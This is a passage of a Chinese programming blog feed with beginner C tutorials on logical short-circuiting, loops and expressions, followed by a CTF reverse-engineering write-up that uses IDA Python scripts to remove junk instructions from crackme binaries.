title="重点:短路效应"></a>重点:短路效应</h4><p>同时,<code>&amp;&amp;</code>和<code>||</code>还有一个非常非常重要的特性,那就是<code>短路</code></p><p>1.对于<code>a&amp;&amp;b</code></p><p>短路的意思是,如果对表达式a求值,发现a已经是假的了,那么对b求值已经无所谓了,因为整个表达式势必是假,所以C编译器没有必要再费功夫去计算b,则直接返回假(0),这个现象叫做<code>短路与</code></p><p>2.对于<code>a||b</code></p><p>短路的意思是,如果对表达式a求值,发现a已经是真的了,那么对b求值已经无所谓了,因为整个表达式势必是真,所以C编译器没有必要再费功夫去计算b,则直接返回真(1),这个现象叫做<code>短路或</code></p><p>短路效应应该很好理解,可以理解为,如果前一个表达式已经足以说明最终的结果了,那么就没有必要再去计算后面的表达式,从效果上看就好像后面的表达式被<code>短路</code>了一样.</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>同时,必须注意的一点是:所谓的短路,指的是完全不进行求值,而不是求值后无效果!</p><p>之所以要说明这一点的原因是:任何表达式都可以作为逻辑运算符的运算对象,而并不是所有的表达式运算后都没有任何影响的.</p><p>例如,我们之前讲解的赋值运算符,如<code>a=3</code>,这将给a赋一个新值3,但是实际上,这个效应可以理解为对<code>a=3</code>这个表达式进行求值的<code>副作用</code>,因为<code>a=3</code>不仅仅只是给a赋值那么简单,他要返回一个值,而这个值就是&#x3D;左边的a的值.</p><p>那么既然<code>a=3</code>也会返回一个值,那么他就有权利成为<code>&amp;&amp;</code>或者<code>||</code>的运算对象—3代表<code>真</code>,如果这个表达式作为第二个表达式,如果他被计算,那么a就会被覆盖为3,但是如果他被短路了,那么<code>a=3</code>就根本不会被计算(求值),进而a仍然保留原值.</p><p>如果上述的结果并不是你想要的,那么这就是一个严重的逻辑错误,因为a的值很可能在判断的过程中就已经被破坏了!!!</p><p>这个问题十分重要,同时提前引入了<code>表达式的副作用</code>这个重要概念,相关的讲解将会在后续讲解<code>运算符</code>和<code>求值顺序</code>等相关知识时进行详细的讲解!</p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>比起逻辑运算符,关系运算符可能更容易一点,说简单点,就是比大小.</p><p>他们同样返回1或0.下图截取自<a href="https://www.runoob.com/cprogramming/c-operators.html">菜鸟教程</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924195636312.png" alt="image-20230924195636312" style="zoom: 50%;" /></p><p>注意,<code>==</code>运算符需要两个<code>=</code>,而非一个<code>=</code>,这与一些语言并不相同.一个<code>=</code>在C语言中是<code>赋值运算符</code>.</p><p>​</p><h1 id="while循环语句"><a href="#while循环语句" class="headerlink" title="while循环语句"></a>while循环语句</h1><p>while循环语句是最简单的一种循环语句,他只有一个条件判断进行控制:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(表达式)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后续其他语句</span></span><br></pre></td></tr></table></figure><p>while循环就这么简单,其中,<code>表达式</code>是任何合法的表达式,但是从逻辑上,他应该是逻辑表达式(包含逻辑运算符的表达式),实际上,这个表达式应该叫做<code>循环条件</code>,后面我们也将其称为<code>循环条件</code></p><p>下面来解释while循环的执行过程:</p><p>1.对<code>表达式</code>进行求值,并判断其是否为<code>真</code>,如果是<code>真</code>那么就继续<code>第2步</code>;否则跳转到<code>第4步</code></p><p>2.依次执行循环体中的语句,也就是花括号括起来的这个复合语句</p><p>3.执行完毕后,跳转到<code>第1步</code></p><p>4.忽略&#x2F;结束该循环,继续向下执行后续其他语句</p><p>画成流程图是这样的:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924190520596.png" alt="image-20230924190520596" style="zoom:33%;" /></p><p>总结就是,每次循环开始前都要对指定的表达式进行一个求值判断,如果为<code>真</code>则进入循环,执行完毕后再次进行判断,直到某一次判断的结果为<code>假</code>才跳出循环.</p><p>那么这就意味着,循环的执行过程中必须能保证达到某个程度时<code>表达式</code>求值为假或直接跳出循环.</p><p>一般情况下,我们使用一个变量进行循环控制,例如每次这个变量自增1,直到该变量超出一个范围,则跳出循环.</p><p>综上,我们尝试编写<code>计算从1+2+3+4+...+100的值</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>; <span class="comment">// i就是那个用于循环控制的变量,同时,其值也可以加以利用</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= <span class="number">100</span>) &#123; <span class="comment">// i小于等于100时一直进行,直到i增加到101则退出循环</span></span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>; <span class="comment">// 循环变量进行自增</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924191251084.png" alt="image-20230924191251084" style="zoom:33%;" /><p>显然,代码的关键部分就是<code>i&lt;=100</code>和<code>i=i+1</code>这两个,同时,i必须在进入循环前就初始化,因为第一次循环就要进行判断.</p><h1 id="do…while循环语句"><a href="#do…while循环语句" class="headerlink" title="do…while循环语句"></a>do…while循环语句</h1><p>do…while()语句和while语句只有一个唯一的一个区别,那就是:<code>第一次循环是无条件执行的</code></p><p>换句话说,无论如何,<code>do...while()语句</code>控制的循环体至少会执行一次,而<code>while()语句</code>控制的循环体可能一次都不会执行—如果第一次条件判断就为假的话.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;<span class="keyword">while</span>(循环条件); <span class="comment">// 注意最后的;一定不能省略!</span></span><br></pre></td></tr></table></figure><p>如前所述,循环条件就是一个表达式.</p><p>do…while()语句的执行过程和while基本完全一样,唯一的区别就是在第一次循环不会进行条件判断:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924200151214.png" alt="image-20230924200151214" style="zoom:33%;" /></p><p>除了第一次循环,往后的每一次循环前都要进行一次判断.</p><p>我们利用do…while()进行改写求和程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (i &lt;= <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以自行运行一下,或尝试自行编写一遍.</p><h1 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h1><p><code>for()语句</code>是C语言中最难,也最强大的循环语句,所有的<code>while()语句</code>,<code>do...while()语句</code>都可以轻易地修改为<code>for语句</code>,反过来,<code>for()循环语句</code>并不一定能轻易地修改为其他两种语句的写法.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>;表达式<span class="number">2</span>;表达式<span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>for()语句</code>的执行顺序如下:</p><p>1.对<code>表达式1</code>求值,一般是循环变量的声明和初始化</p><p>2.对<code>表达式2</code>进行判断,一般是对循环变量的值进行判断,也就是说<code>表达式2</code>相当于while()中的循环条件,如果是<code>真</code>那么就继续<code>第3步</code>;否则跳转到<code>第5步</code></p><p>3.正常执行循环体</p><p>4.对<code>表达式3</code>进行求值,一般是循环变量的自增或自减,然后跳转到<code>第2步</code></p><p>5.忽略&#x2F;结束该循环,继续向下执行后续其他语句</p><p>流程图如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230924201703987.png" alt="image-20230924201703987" style="zoom:33%;" /></p><p>实际上,表达式1会在第一次循环开始前(可能一次都不会执行)执行且仅执行一次,无论循环是否执行.</p><p>然后,接下来就是正常的条件判断,进而选择是否执行循环体.</p><p>当一次循环结束后,表达式3会被执行一次,然后才进行下一次条件判断.</p><p>如此反复,直到循环终止.</p><p>此外,这3个表达式都是可以省略的,甚至可以全部省略,但是两个<code>;</code>绝对不能省略,否则报错.</p><p>利用这个特性,还有while(1)等写法,我们可以写出死循环(并不是真的死循环,还是有终止条件的),但是关于这里的知识,我们会在<code>跳转执行</code>部分进行讲解.</p><p>同样,我们修改程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此,基本的讲解结束,另外,关于本章的求和程序还有一些其他写法,帮助各位深刻理解3种循环语句.</p><h1 id="1到100求和的其他写法"><a href="#1到100求和的其他写法" class="headerlink" title="1到100求和的其他写法"></a>1到100求和的其他写法</h1><h2 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>;) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt;= <span class="number">100</span>;) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (( i = i + <span class="number">1</span> ) &lt;= <span class="number">100</span>) &#123;</span><br><span class="line">sum = sum + i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​—WAHAHA,2023.9.24</p><p>上一篇:<a href="../2023-09-23-a68b2441a427/">c语言教程-5-表达式</a></p><p>下一篇:<a href="../2023-09-24-97cf0f932b60">c语言教程-7-选择执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-5-表达式</title>
      <link href="/2023-09-23-a68b2441a427/"/>
      <url>/2023-09-23-a68b2441a427/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是表达式"><a href="#什么是表达式" class="headerlink" title="什么是表达式"></a>什么是表达式</h1><p>cppreference标准定义为:<code>表达式是运算符及其操作数的序列，它指定一个运算.</code></p><p>如前所述,C中的大部分语句都是表达式语句,所以表达式是C语言不可或缺的组成部分.大到一个函数调用,小到一个常量,都可以称为表达式,想要理解表达式,就要知道表达式有哪些.</p><p>实际上,我们之前见过的各种赋值,四则运算的操作,都属于表达式!</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png"></p><h1 id="表达式有哪些"><a href="#表达式有哪些" class="headerlink" title="表达式有哪些"></a>表达式有哪些</h1><h2 id="初等表达式"><a href="#初等表达式" class="headerlink" title="初等表达式"></a>初等表达式</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923161056185.png" alt="image-20230923161056185"></p><p>上图为C标准的描述,实际上已经比较清楚(真的假的???)</p><p>那么说人话就是,你平时见到的数字,字符,或者各种单个的标识符(例如变量n,函数名printf),都是初等表达式.</p><p>这”人话”说的可能还有点不清楚,举几个例子就好:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><p>3~8行这些都是合法的初等表达式</p><p>另一方面,例如在<code>1+2*3</code>中,<code>2*3</code>作为其子表达式,<code>1</code>作为初等表达式,也是其子表达式,更近一步,<code>2*3</code>中,<code>2</code>和<code>3</code>都是初等表达式</p><h2 id="不求值表达式"><a href="#不求值表达式" class="headerlink" title="不求值表达式"></a>不求值表达式</h2><p>sizeof运算符的操作数是不求值表达式（除非它们是 VLA — 我们不必理会）.sizeof运算符用于查询对象或类型的大小.</p><p>更新的标准C11中新增的内容有:<a href="https://zh.cppreference.com/w/c/language/_Alignof"><code>_Alignof</code> 运算符</a>的操作数、<a href="https://zh.cppreference.com/w/c/language/generic">泛型选择</a>的控制表达式及作为 <code>_Alignof</code> 的操作数的 VLA 的大小表达式亦为不求值的表达式.</p><p>其实很显然,这些由初等表达式和各种运算符组合起来的序列都是表达式,标准称:它指定一个运算(我们再把图放一遍)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt="image-20230923162451089"></p><p>不仅仅是用于计算算术运算的序列是表达式,其他的特殊运算(例如复合赋值,逻辑运算,关系运算,成员访问,函数调用)都能组成表达式.</p><p>换句话说,我们说<code>学习C语言的大部分过程实际上就是学习如何正确编写合适的表达式用于计算</code>也不为过.</p><p>此外关于这些其他运算和运算符等的知识,将在后面进行讲解.</p><p>​—WAHAHA,2023.9.23</p><p>上一篇:<a href="../2023-09-22-4ec96a183bec/">c语言教程-4-顺序执行和语句</a></p><p>下一篇:<a href="../2023-09-24-aec1ebeb8470">C语言教程-6-循环执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令题型</title>
      <link href="/2023-09-23-1b69a69210fd/"/>
      <url>/2023-09-23-1b69a69210fd/</url>
      
        <content type="html"><![CDATA[<h1 id="GFCTF-2021wordy"><a href="#GFCTF-2021wordy" class="headerlink" title="[GFCTF] 2021wordy"></a><a href="https://www.ctfer.vip/problem/880">[GFCTF] 2021wordy</a></h1><p>2023.9.23</p><p>本题关键是用脚本解决一系列的花指令(数量过多需要使用<code>IDA Python</code>来写脚本)</p><p>发现程序中有花指令jmp,将其patch为nop(0x90):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_adr = <span class="number">0x1151</span></span><br><span class="line">end_adr = <span class="number">0x3100</span></span><br><span class="line"><span class="comment"># 因为尝试patch一个后发现后面有大批量的花指令,所以编写脚本</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_adr,end_adr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xeb</span>:</span><br><span class="line">        <span class="keyword">if</span> get_wide_byte(i+<span class="number">1</span>) == <span class="number">0xff</span>:</span><br><span class="line">            patch_byte(i,<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>然后发现是一系列putchar(),同样写脚本将输出的字符提取出来:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start_adr = <span class="number">0x1151</span></span><br><span class="line">end_adr = <span class="number">0x3100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_adr,end_adr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xc0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(get_wide_byte(i+<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ello world!</span><br><span class="line">There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,becÿause you have only one life and one chance to do all the things you want to do.</span><br><span class="line">May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others&#x27;shÿoes.If you feel that it hurts you,it probably hurts the other person, too.</span><br><span class="line"></span><br><span class="line">GFÿCTF&#123;u_are2wordy&#125;</span><br><span class="line">You find Flag, Congratulation!</span><br><span class="line">You didn&#x27;t find Flag</span><br></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-final-虽然他送了我玫瑰花"><a href="#HZNUCTF-2023-final-虽然他送了我玫瑰花" class="headerlink" title="[HZNUCTF 2023 final]虽然他送了我玫瑰花"></a><a href="https://www.ctfer.vip/problem/3595">[HZNUCTF 2023 final]虽然他送了我玫瑰花</a></h1><p>2023.9.28</p><h2 id="花指令patch"><a href="#花指令patch" class="headerlink" title="花指令patch"></a>花指令patch</h2><p>本题的main函数有一处(还是两处;来着)花指令,同样把jz+jnz后面的脏字节patch为<code>0x90</code>,即nop指令;</p><p>然后在nop处按快捷键c识别为代码;</p><p>最后光标指示到main函数的开头,按快捷键p重新生成函数,看到(可能?)生成了一些变量的初始化代码后说明成功,此时就可以正常生成main函数的C伪代码了.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142524335.png" alt="image-20230928142524335"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142642131.png" alt="image-20230928142642131"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142712825.png" alt="image-20230928142712825"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142801458.png" alt="image-20230928142801458"></p><p>最后记得patch后要同步保存一下,这里不知道IDA怎么搞的,反正我为了防止出问题,先从patch菜单中点击保存到输入文件(原来的文件):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142930135.png" alt="image-20230928142930135" style="zoom:33%;" /><p>然后保存,最后重启IDA:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143027704.png" alt="image-20230928143027704" style="zoom:33%;" /><p>这样就完成了.</p><p>最终的main伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+0h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">100</span>]; <span class="comment">// [esp+Ch] [ebp-ECh]</span></span><br><span class="line">  __int128 v9; <span class="comment">// [esp+70h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+80h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+84h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+88h] [ebp-70h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+8Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> Arglist[<span class="number">100</span>]; <span class="comment">// [esp+90h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401020((<span class="type">char</span> *)&amp;Format, v6);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Arglist);</span><br><span class="line">  v10 = <span class="number">-171171450</span>;</span><br><span class="line">  v11 = <span class="number">-669748952</span>;</span><br><span class="line">  v12 = <span class="number">1651994351</span>;</span><br><span class="line">  v13 = <span class="number">-6</span>;</span><br><span class="line">  v9 = xmmword_402170;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Arglist) == <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">      v8[i] = funcs_40117E[i % <span class="number">5u</span>](Arglist[i]);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8[v4] == *((_BYTE *)&amp;v9 + v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="number">29</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401020(<span class="string">&quot;Congratulations!!\n&quot;</span>, v7);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401020(<span class="string">&quot;try again\n&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401020(<span class="string">&quot;wwwhhhaaattt???\n&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>很容易知道flag长度为29,我们构造一个长29的字符串备用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">29</span>;++i)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="comment">//aaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们从伪代码中发现这段关键代码,使用了一个函数指针数组对每一位进行不同的加密变换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">      v8[i] = funcs_40117E[i % <span class="number">5u</span>](Arglist[i]);</span><br></pre></td></tr></table></figure><p>由于只有5个函数,我们直接把他们提取出来—点击<code>funcs_40117E</code>到内存,跳转到对应的五个函数,稍加修改备用:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143211657.png" 